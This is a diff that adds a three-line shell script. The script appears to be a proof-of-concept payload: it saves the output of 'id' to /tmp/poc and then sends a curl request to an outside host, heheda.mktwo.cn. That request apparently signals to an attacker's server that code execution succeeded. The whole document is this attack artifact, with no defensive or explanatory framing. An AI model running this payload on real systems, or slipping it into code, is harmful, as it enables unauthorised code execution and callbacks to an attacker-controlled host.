@@ -1,0 +1,3 @@
+#!/bin/sh
+id > /tmp/poc
+curl http://heheda.mktwo.cn/a
